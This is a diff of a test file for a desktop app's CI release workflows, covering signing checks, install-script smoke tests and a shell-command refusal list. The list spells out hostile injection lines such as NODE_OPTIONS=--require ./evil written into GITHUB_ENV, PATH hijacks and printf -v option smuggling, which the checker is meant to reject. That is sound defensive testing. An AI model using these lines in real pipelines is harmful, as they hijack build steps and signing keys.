+      'xattr -w com.example.x y "$app"',
+      // Writes where the job's code lives, or into later steps' environment.
+      "echo x > scripts/release/build.mjs",
+      "echo x >> node_modules/.bin/tauri",
+      "printf x > ./src-tauri/tauri.macos.conf.json",
+      "printf x > target/../scripts/x.mjs",
+      'echo "PATH=./bin" >> "$GITHUB_PATH"',
+      'echo "NODE_OPTIONS=--require ./evil" >> "${GITHUB_ENV}"',
+      'cp "$out/evil" scripts/release/x.mjs',
+      "cp a src-tauri/tauri.macos.conf.json",
+      'cp -r "$RUNNER_TEMP/x" node_modules/',
+      'cp a "$RUNNER_TEMP/../work/scripts/x"',
+      // tauri with flags or arguments the workflow doesn't pass.
+      "npx --no -- tauri bundle --config ./evil.json",
+      'npx --no -- tauri bundle --verbose --ci --target "$TRIPLE" --no-sign',
+      "npx --no -- tauri bundle --target x86_64-apple-darwin",
+      'npx --no -- tauri bundle --verbose --verbose',
+      'npx --no -- tauri signer sign -k "$KEY" "$RUNNER_TEMP/bundles/$name"',
+      // Variables a tool reads, and a here-document.
+      'PATH=./bin cp a "$RUNNER_TEMP/b"',
+      "GIT_EXTERNAL_DIFF=./evil git diff --exit-code -- x",
+      "NODE_OPTIONS=--require=./evil node scripts/release/check-artifact.mjs x y",
+      "read -r PATH <<< ./bin",
+      "local PATH=./bin",
+      "printf -v PATH '%s' ./bin",
+      "printf -vNODE_OPTIONS '%s' --require=./evil",
+      "printf -v",
+      "printf -x '%s' y",
+      // An option an expansion makes: bash expands the word before printf reads it.
+      "o=-vPATH; printf \"$o\" '%s' ./bin",
+      "printf \"$(echo -vNODE_OPTIONS)\" '%s' --require=./evil",
+      "printf `echo -vPATH` '%s' ./bin",
+      "printf \"${o}\" '%s' ./bin",
+      "printf -v\"$name\" '%s' x",
+      "read -r x <<EOF",
+      // Writes into the binaries a job with the keys bundles.
+      'printf x > "target/$TRIPLE/release/fleetify-app"',
     ]) {
       assert.notDeepEqual(refused(script), [], script);
     }
     for (const script of [
       "npm ci --ignore-scripts",
       'npx --no -- tauri bundle --verbose --ci --target "$TRIPLE"',
+      'npx --no -- tauri bundle --verbose --ci --target "$TRIPLE" --bundles "$BUNDLES" --config src-tauri/tauri.release.conf.json --config "$RUNNER_TEMP/dry-run-config/dry-run.json"',
+      'npx --no -- tauri signer sign -f "$RUNNER_TEMP/dry-run/updater.key" -p "" "$RUNNER_TEMP/bundles/$name" < /dev/null',
+      'cp "$RUNNER_TEMP/notices/THIRD-PARTY-NOTICES" THIRD-PARTY-NOTICES',
+      'cp "$RUNNER_TEMP/dry-run/updater.key.pub" "$RUNNER_TEMP/bundles/updater-pubkey.txt"',
+      'security find-identity -v -p codesigning > "$out/find-identity.txt" 2>&1 || true',
+      "git ls-files --others -- 'src-tauri/tauri*.conf*' 'src-tauri/Tauri*.toml'",
+      "git diff --exit-code -- 'src-tauri/tauri*.conf*'",
+      "rustup toolchain install",
+      "found=$(cd \"$out\" && find . -type f | sed -e 's|^\\./||' | LC_ALL=C sort)",
+      'printf \'%s\' "$APPLE_CERTIFICATE" | base64 --decode > "$dir/release.p12"',
       'npx --no -- tauri signer sign "$RUNNER_TEMP/bundles/$name" < /dev/null',
       'node scripts/release/check-artifact.mjs "$RUNNER_TEMP/notices" THIRD-PARTY-NOTICES',
       'expected=$(node scripts/release/release-assets.mjs unsigned "$TRIPLE" "$VERSION")',
@@ -1207,6 +1514,10 @@ capture() {
       'mkdir -p "$(dirname "$file")"',
       'cp -p "$out/$file" "$file"',
       'capture() {\n  codesign "$@" "$app"\n}\ncapture verify --verify',
+      "printf -v line '%s' x",
+      "printf -vline '%s' x",
+      "printf -- '%s' -v",
+      "printf '%s\\n' -v PATH",
     ]) {
       assert.deepEqual(refused(script), [], script);
     }
@@ -1555,13 +1866,23 @@ capture() {
     assert.deepEqual(sudo.map((line) => line.trim().split(" ").slice(0, 3).join(" ")), ["sudo security add-trusted-cert"], "macos-keychain.sh runs another sudo command");
   });
 
-  yamlTest("bundle-macos checks the app's signature with macos-signature.mjs in every build, before it collects the bundles", () => {
+  yamlTest("bundle-macos checks the app's signature with macos-signature.mjs in every build, a release build's against the pinned designated requirement, before it collects the bundles", () => {
+    // A dry run signs with an identity made for the run, whose designated
+    // requirement no file can pin, so it checks the shape only.
     const steps = stepsOf("bundle-macos");
-    const check = steps.findIndex((step) => commandLines(step).includes('node scripts/release/macos-signature.mjs "target/$TRIPLE/release/bundle/macos/Fleetify.app"'));
-    assert.ok(check !== -1, "bundle-macos doesn't check the app's signature");
-    assert.equal(steps[check].if, undefined, "the signature check must run in release builds and dry runs alike");
-    assert.ok(check > steps.findLastIndex(isTauriBundle), "the signature is checked before the app is bundled");
-    assert.ok(check < steps.findIndex((step) => scriptOf(step).includes("collect-bundles.mjs")), "the bundles are collected before the signature is checked");
+    const checks = steps.filter((step) => scriptOf(step).includes("macos-signature.mjs"));
+    const release = checks.filter((step) => requires(step.if, RELEASE_ONLY));
+    const dryRun = checks.filter((step) => requires(step.if, DRY_RUN_ONLY));
+    assert.deepEqual([checks.length, release.length, dryRun.length], [2, 1, 1], `bundle-macos must check the signature once if "${RELEASE_ONLY}" and once if "${DRY_RUN_ONLY}"`);
+    const check = 'node scripts/release/macos-signature.mjs "target/$TRIPLE/release/bundle/macos/Fleetify.app"';
+    assert.deepEqual(commandLines(release[0]), [`${check} --expected-dr ${DR_FILE}`], `${release[0].name} doesn't compare the designated requirement with ${DR_FILE}`);
+    assert.deepEqual(commandLines(dryRun[0]), [check], `${dryRun[0].name}`);
+    assert.ok(existsSync(join(ROOT, DR_FILE)), `${DR_FILE} is missing`);
+    for (const step of checks) {
+      const at = steps.indexOf(step);
+      assert.ok(at > steps.findLastIndex(isTauriBundle), `${step.name}: the signature is checked before the app is bundled`);
+      assert.ok(at < steps.findIndex((candidate) => scriptOf(candidate).includes("collect-bundles.mjs")), `${step.name}: the bundles are collected before the signature is checked`);
+    }
   });
 
   yamlTest("scan-secrets.mjs scans the UI and the binaries in every compile leg, after the app is built", () => {
@@ -1731,7 +2052,7 @@ capture() {
   });
 
   yamlTest("a macOS dry run keeps codesign's own output and the app's extended attributes, whatever the checks say", () => {
-    // So the codesign fixtures of macos-signature.test.mjs can be replaced with real output.
+    // The codesign fixtures of macos-signature.test.mjs are such output.
     const steps = stepsOf("bundle-macos");
     const when = ["always()", DRY_RUN_ONLY];
     const capture = steps.find((step) => ["--verify", "-r-", "-vvv", "--entitlements"].every((arg) => scriptOf(step).includes(arg)) && /\bcodesign\b/.test(scriptOf(step)));
@@ -1767,7 +2088,7 @@ describe("release-dry-run.yml", () => {
     });
   });
 
-  scriptTest("meta skips release commits, picks the environment and signs with the release keys only from main", () => {
+  scriptTest("meta skips release commits, picks the environment, signs with the release keys only from main, and pins a candidate's designated requirement", () => {
     const meta = jobOf(DRY_RUN, "meta");
     assert.equal(
       String(meta.if).replace(/\s+/g, " ").trim(),
@@ -1776,7 +2097,11 @@ describe("release-dry-run.yml", () => {
     const step = (meta.steps ?? []).find((candidate) => candidate.id === "meta");
     assert.ok(step, "meta has no step with id meta");
     assert.equal(step.env?.SIGNING, "${{ inputs.signing }}");
-    assert.deepEqual(meta.outputs, { version: "${{ steps.meta.outputs.version }}", environment: "${{ steps.meta.outputs.environment }}" });
+    assert.deepEqual(meta.outputs, {
+      version: "${{ steps.meta.outputs.version }}",
+      environment: "${{ steps.meta.outputs.environment }}",
+      "expected-dr": "${{ steps.meta.outputs.expected-dr }}",
+    });
     inTempDir((dir) => {
       writeFileSync(join(dir, "package.json"), `${JSON.stringify({ version: "1.2.3" })}\n`);
       const run = (signing, ref) => {
@@ -1785,14 +2110,16 @@ describe("release-dry-run.yml", () => {
         const result = runScript(step.run, { cwd: dir, env: { SIGNING: signing, GITHUB_REF: ref, GITHUB_OUTPUT: output } });
         return { status: result.status, output: readFileSync(output, "utf8"), log: `${result.stdout}${result.stderr}` };
       };
-      for (const [signing, ref, environment] of [
-        ["", "refs/heads/main", "dry-run"],
-        ["ephemeral", "refs/pull/7/merge", "dry-run"],
-        ["release", "refs/heads/main", "release"],
+      // A candidate is signed with the release identity, whose designated
+      // requirement is pinned; a dry run's identity is made for the run.
+      for (const [signing, ref, environment, dr] of [
+        ["", "refs/heads/main", "dry-run", ""],
+        ["ephemeral", "refs/pull/7/merge", "dry-run", ""],
+        ["release", "refs/heads/main", "release", DR_FILE],
       ]) {
         const result = run(signing, ref);
         assert.equal(result.status, 0, `signing "${signing}" on ${ref}:\n${result.log}`);
-        assert.equal(result.output, `version=1.2.3\nenvironment=${environment}\n`, `signing "${signing}" on ${ref}`);
+        assert.equal(result.output, `version=1.2.3\nenvironment=${environment}\nexpected-dr=${dr}\n`, `signing "${signing}" on ${ref}`);
       }
       const offMain = run("release", "refs/heads/feature");
       assert.notEqual(offMain.status, 0, "signing: release off main must fail");
@@ -1822,21 +2149,47 @@ describe("release-dry-run.yml", () => {
     assert.doesNotMatch(scriptOf(release[0]), /--per-target-pubkeys/);
   });
 
-  yamlTest("assemble downloads only the bundles and the notices", () => {
-    // assemble.mjs refuses any other folder in --in.
-    const steps = jobOf(DRY_RUN, "assemble").steps ?? [];
-    const downloads = steps
-      .filter((step) => usesAction(step, "actions/download-artifact"))
-      .map((step) => ({ what: step.with?.name ?? step.with?.pattern ?? "every artifact", path: step.with?.path, merge: step.with?.["merge-multiple"] ?? false }));
-    assert.deepEqual(downloads.sort((a, b) => (a.what < b.what ? -1 : 1)), [
-      { what: "bundles-*", path: "artifacts", merge: false },
-      { what: "third-party-notices", path: "artifacts/third-party-notices", merge: false },
-    ]);
-    const upload = steps.find((step) => usesAction(step, "actions/upload-artifact"));
-    assert.deepEqual(
-      [upload?.with?.name, upload?.with?.path, upload?.with?.["if-no-files-found"], upload?.with?.["retention-days"]],
-      ["release", "release", "error", 14],
-    );
+  yamlTest("each assemble adds the install scripts from scripts/release: the dry run's in both environments, and the release's", () => {
+    // No build makes them; assemble.mjs refuses a release without them.
+    for (const [rel, count] of [
+      [DRY_RUN, 2],
+      [RELEASE, 1],
+    ]) {
+      const runs = (jobOf(rel, "assemble").steps ?? []).filter((step) => scriptOf(step).includes("assemble.mjs"));
+      assert.equal(runs.length, count, `${rel}'s assemble job must run assemble.mjs ${count} time(s)`);
+      for (const step of runs) {
+        const extras = [...scriptOf(step).matchAll(/(?:^|\s)--extra\s+(\S+)/g)].map(([, path]) => path);
+        assert.deepEqual(extras, INSTALL_SCRIPTS.map((name) => `scripts/release/${name}`), `${rel}: ${step.name}`);
+      }
+      // The job checks out scripts/release, which holds them.
+      const checkout = (jobOf(rel, "assemble").steps ?? []).find((step) => usesAction(step, "actions/checkout"));
+      assert.ok(String(checkout?.with?.["sparse-checkout"]).split("\n").includes("scripts/release"), `${rel}'s assemble doesn't check out scripts/release`);
+    }
+  });
+
+  yamlTest("each assemble downloads only the bundles and the notices, and uploads the release for the smoke", () => {
+    // assemble.mjs refuses any other folder in --in. A candidate's release is
+    // kept for the RC checks; a release's files are on GitHub, and its
+    // artifact serves only the smoke, so it is kept as long as the builds'.
+    for (const [rel, retention] of [
+      [DRY_RUN, 14],
+      [RELEASE, 7],
+    ]) {
+      const steps = jobOf(rel, "assemble").steps ?? [];
+      const downloads = steps
+        .filter((step) => usesAction(step, "actions/download-artifact"))
+        .map((step) => ({ what: step.with?.name ?? step.with?.pattern ?? "every artifact", path: step.with?.path, merge: step.with?.["merge-multiple"] ?? false }));
+      assert.deepEqual(downloads.sort((a, b) => (a.what < b.what ? -1 : 1)), [
+        { what: "bundles-*", path: "artifacts", merge: false },
+        { what: "third-party-notices", path: "artifacts/third-party-notices", merge: false },
+      ], `${rel}'s downloads`);
+      const uploads = steps.filter((step) => usesAction(step, "actions/upload-artifact"));
+      assert.deepEqual(
+        uploads.map((step) => [step.with?.name, step.with?.path, step.with?.["if-no-files-found"], step.with?.["retention-days"]]),
+        [["release", "release", "error", retention]],
+        `${rel}'s upload`,
+      );
+    }
   });
 });
 
@@ -1945,6 +2298,9 @@ const SMOKE_SETTINGS = [
   { CSP_ORIGIN: "https://eu.i.posthog.com", EXPECT_POSTHOG_SINK: "true", REHEARSE: "true" },
 ];
 
+/** Whether a smoke.yml step launches a bundle (launch-smoke.mjs run), rather than serving the release to an install script. */
+const isLaunch = (step) => scriptOf(step).includes("launch-smoke.mjs") && !scriptOf(step).includes("serve-release");
+
 let smokeLaunches;
 
 /**
@@ -1955,7 +2311,7 @@ let smokeLaunches;
 function launches() {
   smokeLaunches ??= Object.entries(workflow(SMOKE).jobs ?? {}).flatMap(([job, { steps = [] }]) =>
     steps
-      .filter((step) => scriptOf(step).includes("launch-smoke.mjs"))
+      .filter(isLaunch)
       .map((step) => ({
         job,
         step,
@@ -1977,13 +2333,15 @@ function launches() {
 const bundleTypeOf = ({ runs }) => argValue(runs[1].calls[0]?.args ?? [], "--bundle-type");
 
 describe("smoke.yml", () => {
-  yamlTest("it takes the version, whether to rehearse an update, and a pinned designated requirement", () => {
+  yamlTest("it takes the version, whether to rehearse an update, a pinned designated requirement, and the commit to take the release scripts from", () => {
     const inputs = triggersOf(workflow(SMOKE)).workflow_call?.inputs ?? {};
-    assert.deepEqual(Object.keys(inputs).sort(), ["expected-dr", "rehearse", "version"]);
+    assert.deepEqual(Object.keys(inputs).sort(), ["expected-dr", "ref", "rehearse", "version"]);
     const shape = ({ type, required, default: fallback }) => ({ type, required, default: fallback });
     assert.deepEqual(shape(inputs.version), { type: "string", required: true, default: undefined });
     assert.deepEqual(shape(inputs.rehearse), { type: "boolean", required: true, default: undefined });
     assert.deepEqual(shape(inputs["expected-dr"]), { type: "string", required: false, default: "" });
+    // Empty, actions/checkout takes the commit the run is on.
+    assert.deepEqual(shape(inputs.ref), { type: "string", required: false, default: "" });
     assert.deepEqual(
       Object.fromEntries(["VERSION", "REHEARSE", "EXPECTED_DR", "CSP_ORIGIN", "EXPECT_POSTHOG_SINK"].map((name) => [name, workflow(SMOKE).env?.[name]])),
       {
@@ -1996,7 +2354,7 @@ describe("smoke.yml", () => {
     );
   });
 
-  yamlTest("each job checks out only scripts/release, into tools/, and runs the scripts from there", () => {
+  yamlTest("each job checks out only scripts/release, at the commit the ref input names, into tools/, and runs the scripts from there", () => {
     // Without the source tree at the workspace's root, nothing the bundles
     // do can lean on it, as nothing a user runs can.
     const nvmrc = read(".nvmrc").trim();
@@ -2004,7 +2362,11 @@ describe("smoke.yml", () => {
       const steps = job.steps ?? [];
       const checkouts = steps.filter((step) => usesAction(step, "actions/checkout"));
       assert.equal(checkouts.length, 1, `job ${id} must check out once`);
-      assert.deepEqual(checkouts[0].with, { path: "tools", "sparse-checkout": "scripts/release", "sparse-checkout-cone-mode": false, "persist-credentials": false }, `job ${id}'s checkout`);
+      assert.deepEqual(
+        checkouts[0].with,
+        { ref: "${{ inputs.ref }}", path: "tools", "sparse-checkout": "scripts/release", "sparse-checkout-cone-mode": false, "persist-credentials": false },
+        `job ${id}'s checkout`,
+      );
       const node = steps.find((step) => usesAction(step, "actions/setup-node"));
       assert.equal(String(node?.with?.["node-version"]), nvmrc, `job ${id} must set up Node ${nvmrc}, as .nvmrc says (it isn't checked out)`);
       const download = steps.find((step) => usesAction(step, "actions/download-artifact"));
@@ -2095,7 +2457,7 @@ describe("smoke.yml", () => {
     const steps = jobOf(SMOKE, "macos").steps ?? [];
     const check = steps.find((step) => scriptOf(step).includes("macos-signature.mjs"));
     assert.ok(check, "the macOS job doesn't check the app's signature");
-    assert.ok(steps.indexOf(check) < steps.findIndex((step) => scriptOf(step).includes("launch-smoke.mjs")), "the signature is checked before the launch");
+    assert.ok(steps.indexOf(check) < steps.findIndex(isLaunch), "the signature is checked before the launch");
     const [shapeOnly] = runSmokeStep(check.run, { EXPECTED_DR: "" });
     assert.deepEqual(shapeOnly.args, ["tools/scripts/release/macos-signature.mjs", "<dir>/runner-temp/dmg/Fleetify.app"]);
     const [pinned] = runSmokeStep(check.run, { EXPECTED_DR: "scripts/release/macos-designated-requirement.txt" });
@@ -2130,13 +2492,1068 @@ describe("smoke.yml", () => {
   });
 });
 
+/** Where each smoke job serves the release to its install script: 18081, the port kept for it. */
+const RELEASE_SERVER = "http://127.0.0.1:18081";
+/** The release server's command line, for a release of version 1.2.3. */
+const SERVE_RELEASE = "tools/scripts/release/launch-smoke.mjs serve-release --dir release --version 1.2.3 --port 18081";
+
+/** A smoke job's "Install via script" step, the one that serves the release. */
+function installStep(job) {
+  const steps = (jobOf(SMOKE, job).steps ?? []).filter((step) => scriptOf(step).includes("serve-release"));
+  assert.equal(steps.length, 1, `job ${job} must serve the release to an install script once`);
+  return steps[0];
+}
+
+/**
+ * node, as an install step's test fakes it: it logs its arguments. As
+ * launch-smoke.mjs serve-release, it says it is serving and waits, until a
+ * SIGTERM, which it logs as "stopped"; as macos-signature.mjs, it exits
+ * STUB_SIGNATURE_EXIT.
+ */
+const FAKE_NODE = `#!/bin/sh
+trap 'kill "$sleeper" 2> /dev/null; echo stopped >> "$STUB_LOG.node"; exit 0' TERM
+printf '%s\\n' "$*" >> "$STUB_LOG.node"
+case $1 in
+  *launch-smoke.mjs)
+    echo "launch-smoke: serving $4 as release v$6"
+    sleep 30 &
+    sleeper=$!
+    wait "$sleeper"
+    echo "not stopped" >> "$STUB_LOG.node" ;;
+  *macos-signature.mjs) exit "\${STUB_SIGNATURE_EXIT:-0}" ;;
+  *) exit 1 ;;
+esac
+`;
+
+/**
+ * The install script a step pipes into sh, as its test fakes it: it logs its
+ * arguments and the variables it got, then installs, or, with STUB_FAULT,
+ * gets one thing wrong: the AppImage's bytes (file), the menu entry's Exec
+ * line (exec) or the icon (icon).
+ */
+const FAKE_INSTALL_SCRIPT = `#!/bin/sh
+printf 'args %s\\n' "$*" >> "$STUB_LOG.install"
+printf 'base %s\\nhome %s\\ndata %s\\n' "\${FLEETIFY_INSTALL_BASE:-}" "\${HOME:-}" "\${XDG_DATA_HOME:-}" >> "$STUB_LOG.install"
+dir=
+while [ $# -gt 0 ]; do
+  case $1 in --dir) dir=$2; shift 2 ;; *) shift ;; esac
+done
+mkdir -p "$dir"
+if [ "$STUB_PLATFORM" = macos ]; then
+  mkdir -p "$dir/Fleetify.app/Contents/MacOS"
+  echo plist > "$dir/Fleetify.app/Contents/Info.plist"
+  echo app > "$dir/Fleetify.app/Contents/MacOS/fleetify-app"
+  exit 0
+fi
+if [ "\${STUB_FAULT:-}" = file ]; then echo "not the AppImage" > "$dir/fleetify"; else cp release/*.AppImage "$dir/fleetify"; fi
+chmod 755 "$dir/fleetify"
+mkdir -p "$XDG_DATA_HOME/applications" "$XDG_DATA_HOME/icons/hicolor/256x256/apps"
+if [ "\${STUB_FAULT:-}" = exec ]; then line="Exec=fleetify %U"; else line="Exec=$dir/fleetify %U"; fi
+printf '[Desktop Entry]\\n%s\\n' "$line" > "$XDG_DATA_HOME/applications/fleetify.desktop"
+if [ "\${STUB_FAULT:-}" != icon ]; then printf '\\211PNG\\r\\n\\032\\nicon\\n' > "$XDG_DATA_HOME/icons/hicolor/256x256/apps/fleetify.png"; fi
+`;
+
+/**
+ * Run a bash install step's script with stand-ins: node (FAKE_NODE), curl,
+ * which logs its arguments and serves FAKE_INSTALL_SCRIPT, and for macOS
+ * xattr, plutil, lipo and uname, which answer for an Apple silicon Mac with
+ * Fleetify 1.2.3 installed, unless STUB_QUARANTINE (on the app),
+ * STUB_QUARANTINE_INSIDE (on a file in it), STUB_APP_VERSION or STUB_LIPO say
+ * otherwise. The script runs as the runner runs it, with the step's env, in
+ * a folder whose release/ holds an AppImage of version 1.2.3:
+ * { status, output, node, curl, install }, the last three the logged lines.
+ */
+function runInstallStep(step, { platform, env = {} }) {
+  return inTempDir((dir) => {
+    const bin = join(dir, "bin");
+    for (const sub of ["bin", "release", "runner-temp"]) mkdirSync(join(dir, sub));
+    writeFileSync(join(dir, "release", "Fleetify_1.2.3_amd64.AppImage"), "the release's AppImage\n");
+    const stub = (name, body) => writeFileSync(join(bin, name), `#!/bin/sh\n${body}\n`, { mode: 0o755 });
+    writeFileSync(join(bin, "node"), FAKE_NODE, { mode: 0o755 });
+    stub("curl", 'printf \'%s\\n\' "$*" >> "$STUB_LOG.curl"\ncat "$STUB_INSTALL_SCRIPT"');
+    stub("xattr", [
+      'case $1 in',
+      '  -p) if [ -n "${STUB_QUARANTINE:-}" ]; then echo "0081;6740a1b2;curl;"; exit 0; fi; echo "xattr: $3: No such xattr: $2" >&2; exit 1 ;;',
+      '  -lr) if [ -n "${STUB_QUARANTINE_INSIDE:-}" ]; then echo "$2/Contents/MacOS/fleetify-app: com.apple.quarantine: 0081;6740a1b2;curl;"; fi ;;',
+      '  *) exit 2 ;;',
+      'esac',
+    ].join("\n"));
+    stub("plutil", 'case $2 in CFBundleShortVersionString) echo "${STUB_APP_VERSION:-1.2.3}" ;; CFBundleExecutable) echo fleetify-app ;; *) exit 1 ;; esac');
+    stub("lipo", 'echo "${STUB_LIPO:-arm64}"');
+    stub("uname", 'case $1 in -m) echo arm64 ;; *) echo Darwin ;; esac');
+    writeFileSync(join(dir, "install.sh"), FAKE_INSTALL_SCRIPT);
+    const log = join(dir, "stub");
+    const result = spawnSync("bash", ["--noprofile", "--norc", "-eo", "pipefail", "-c", step.run], {
+      cwd: dir,
+      env: {
+        PATH: `${bin}:${process.env.PATH}`,
+        HOME: process.env.HOME,
+        RUNNER_TEMP: join(dir, "runner-temp"),
+        VERSION: "1.2.3",
+        EXPECTED_DR: "",
+        STUB_LOG: log,
+        STUB_INSTALL_SCRIPT: join(dir, "install.sh"),
+        STUB_PLATFORM: platform,
+        ...step.env,
+        ...env,
+      },
+      encoding: "utf8",
+      timeout: 60_000,
+    });
+    const relative = (text) => text.split(dir).join("<dir>");
+    const logged = (name) => (existsSync(`${log}.${name}`) ? relative(readFileSync(`${log}.${name}`, "utf8")).split("\n").filter(Boolean) : []);
+    return { status: result.status, output: relative(`${result.stdout}${result.stderr}`), node: logged("node"), curl: logged("curl"), install: logged("install") };
+  });
+}
+
+describe("smoke.yml's install via script", () => {
+  yamlTest("each job installs once with its install script, after its launches and before its uploads, from the release served on 127.0.0.1:18081", () => {
+    for (const id of ["linux", "macos", "windows"]) {
+      const steps = jobOf(SMOKE, id).steps ?? [];
+      const step = installStep(id);
+      assert.equal(step.name, "Install via script", `job ${id}`);
+      assert.deepEqual(step.env, { FLEETIFY_INSTALL_BASE: RELEASE_SERVER }, `job ${id}'s install step env`);
+      assert.equal(step.if, undefined, `job ${id}: the install via script must run in every smoke`);
+      assert.equal(step["continue-on-error"], undefined, `job ${id}: the install via script must fail the job`);
+      const at = steps.indexOf(step);
+      assert.ok(at > steps.findLastIndex(isLaunch), `job ${id}: the install via script must come after the launches`);
+      assert.ok(at < steps.findIndex((candidate) => usesAction(candidate, "actions/upload-artifact")), `job ${id}: the install via script must come before the logs' upload`);
+    }
+  });
+
+  scriptTest("Linux: the one-liner, from the served release, installs into $RUNNER_TEMP/bin with a home of the step's own, and the server stops after", () => {
+    const run = runInstallStep(installStep("linux"), { platform: "linux" });
+    assert.equal(run.status, 0, run.output);
+    assert.deepEqual(run.node, [SERVE_RELEASE, "stopped"]);
+    assert.deepEqual(run.curl, [`-fsSL --retry 10 --retry-connrefused --retry-delay 1 ${RELEASE_SERVER}/latest/download/install.sh`]);
+    assert.deepEqual(run.install, [
+      "args --dir <dir>/runner-temp/bin",
+      `base ${RELEASE_SERVER}`,
+      "home <dir>/runner-temp/home-install",
+      "data <dir>/runner-temp/home-install/.local/share",
+    ]);
+  });
+
+  scriptTest("Linux: another file than the release's AppImage, a menu entry without its Exec line or no icon fails the step, and the server stops all the same", () => {
+    for (const fault of ["file", "exec", "icon"]) {
+      const run = runInstallStep(installStep("linux"), { platform: "linux", env: { STUB_FAULT: fault } });
+      assert.notEqual(run.status, 0, `${fault}:\n${run.output}`);
+      assert.match(run.output, /::error::/, fault);
+      assert.deepEqual(run.node, [SERVE_RELEASE, "stopped"], fault);
+    }
+  });
+
+  scriptTest("macOS: the one-liner installs Fleetify.app into $RUNNER_TEMP/Applications2, whose signature is checked, against a pinned requirement when given", () => {
+    const signature = "tools/scripts/release/macos-signature.mjs <dir>/runner-temp/Applications2/Fleetify.app";
+    const plain = runInstallStep(installStep("macos"), { platform: "macos" });
+    assert.equal(plain.status, 0, plain.output);
+    assert.deepEqual(plain.node, [SERVE_RELEASE, signature, "stopped"]);
+    assert.deepEqual(plain.curl, [`-fsSL --retry 10 --retry-connrefused --retry-delay 1 ${RELEASE_SERVER}/latest/download/install.sh`]);
+    assert.deepEqual(plain.install.slice(0, 2), ["args --dir <dir>/runner-temp/Applications2", `base ${RELEASE_SERVER}`]);
+    const pinned = runInstallStep(installStep("macos"), { platform: "macos", env: { EXPECTED_DR: "scripts/release/macos-designated-requirement.txt" } });
+    assert.equal(pinned.status, 0, pinned.output);
+    assert.equal(pinned.node[1], `${signature} --expected-dr tools/scripts/release/macos-designated-requirement.txt`);
+  });
+
+  scriptTest("macOS: a quarantine flag on the app or a file in it, a failed signature check, or another version or arch fails the step", () => {
+    for (const [env, says] of [
+      [{ STUB_QUARANTINE: "1" }, /quarantine/],
+      [{ STUB_QUARANTINE_INSIDE: "1" }, /quarantine/],
+      [{ STUB_SIGNATURE_EXIT: "1" }, null],
+      [{ STUB_APP_VERSION: "1.2.2" }, /1\.2\.2/],
+      [{ STUB_LIPO: "x86_64" }, /x86_64/],
+    ]) {
+      const run = runInstallStep(installStep("macos"), { platform: "macos", env });
+      const where = JSON.stringify(env);
+      assert.notEqual(run.status, 0, `${where}:\n${run.output}`);
+      if (says !== null) assert.match(run.output, says, where);
+      assert.equal(run.node.at(-1), "stopped", `${where}: the server wasn't stopped`);
+    }
+  });
+
+  yamlTest("Windows: install.ps1 -Silent from the served release, under Windows PowerShell 5.1, must put the app back, and its download carries no Mark-of-the-Web", () => {
+    const step = installStep("windows");
+    // Windows PowerShell 5.1, which every Windows 10 and 11 has, as users run the script.
+    assert.equal(step.shell, "powershell");
+    const script = scriptOf(step);
+    const order = [
+      // What an earlier run could have left in the download folder.
+      "$downloads = Join-Path $env:TEMP 'fleetify-install'",
+      "Set-Content -LiteralPath (Join-Path $downloads 'Fleetify_0.0.1_x64-setup.exe')",
+      "Set-Content -LiteralPath (Join-Path $downloads 'notes.txt')",
+      "'tools/scripts/release/launch-smoke.mjs', 'serve-release', '--dir', 'release', '--version', $env:VERSION, '--port', '18081'",
+      '"$env:FLEETIFY_INSTALL_BASE/latest/download/install.ps1"',
+      // An answer with an error status ends the wait; only no answer is retried.
+      "if ($null -ne $_.Exception.Response) {",
+      "Start-Sleep -Seconds 1",
+      "Remove-Item -LiteralPath $env:APP_EXE",
+      ")) -Silent",
+      "Test-Path -LiteralPath $env:APP_EXE",
+      // install.ps1 removed the older installer, and only its own files.
+      "if (Test-Path -LiteralPath (Join-Path $downloads 'Fleetify_0.0.1_x64-setup.exe')) { throw",
+      "if (-not (Test-Path -LiteralPath (Join-Path $downloads 'notes.txt'))) { throw",
+      `Get-Item "$env:TEMP\\fleetify-install\\*-setup.exe" -Stream Zone.Identifier -ErrorAction SilentlyContinue`,
+    ];
+    const at = order.map((text) => script.indexOf(text));
+    assert.deepEqual(order.filter((text, i) => at[i] === -1), [], "the Windows install step is missing these");
+    assert.deepEqual([...at].sort((a, b) => a - b), at, "the Windows install step does these out of order");
+    // The server, and only it, stops however the step ends.
+    assert.match(script, /\}\s*finally\s*\{\s*Stop-Process -Id \$server\.Id\b/);
+  });
+});
+
 describe("release-dry-run.yml's smoke", () => {
-  yamlTest("it smoke-tests the assembled release, rehearsing updates only with a dry-run build", () => {
-    // Only a dry-run build's updater asks the smoke's update server.
+  yamlTest("it smoke-tests the assembled release, rehearsing updates only with a dry-run build, and a candidate against the pinned designated requirement", () => {
+    // Only a dry-run build's updater asks the smoke's update server; meta
+    // names the pinned requirement for a candidate alone.
     const smoke = jobOf(DRY_RUN, "smoke");
     assert.equal(smoke.uses, "./.github/workflows/smoke.yml");
     assert.deepEqual([smoke.needs].flat().sort(), ["assemble", "meta"]);
-    assert.deepEqual(smoke.with, { version: "${{ needs.meta.outputs.version }}", rehearse: "${{ needs.meta.outputs.environment == 'dry-run' }}" });
+    assert.deepEqual(smoke.with, {
+      version: "${{ needs.meta.outputs.version }}",
+      rehearse: "${{ needs.meta.outputs.environment == 'dry-run' }}",
+      "expected-dr": "${{ needs.meta.outputs.expected-dr }}",
+    });
+  });
+});
+
+// ── release.yml ─────────────────────────────────────────────────────────────
+
+/** release.yml's jobs that read the Release Bot's key: they name the release-bot environment, which holds it. */
+const RELEASE_BOT_JOBS = ["release-please", "assemble", "publish"];
+
+/** The Release Bot's private key, a secret of the release-bot environment. */
+const RELEASE_BOT_KEY = "RELEASE_BOT_PRIVATE_KEY";
+
+/** An output of release.yml's release-please job, as a later job reads it. */
+const fromReleasePlease = (name) => `\${{ needs.release-please.outputs.${name} }}`;
+
+/** A release.yml job's steps. */
+const releaseStepsOf = (id) => jobOf(RELEASE, id).steps ?? [];
+
+/** The steps of a release.yml job that make the Release Bot's token. */
+const tokenStepsOf = (id) => releaseStepsOf(id).filter((step) => usesAction(step, "actions/create-github-app-token"));
+
+/** A token step's inputs: the App's client ID, a variable; its key, a secret; and write access to `permissions`. */
+const tokenInputs = (permissions) => ({
+  "client-id": "${{ vars.RELEASE_BOT_CLIENT_ID }}",
+  "private-key": `\${{ secrets.${RELEASE_BOT_KEY} }}`,
+  ...Object.fromEntries(permissions.map((name) => [`permission-${name}`, "write"])),
+});
+
+/** Whether a step's script runs gh. */
+const runsGh = (step) => simpleCommands(scriptOf(step)).some(({ words }) => words[0] === "gh");
+
+/** The one step of a release.yml job whose script holds `text`. */
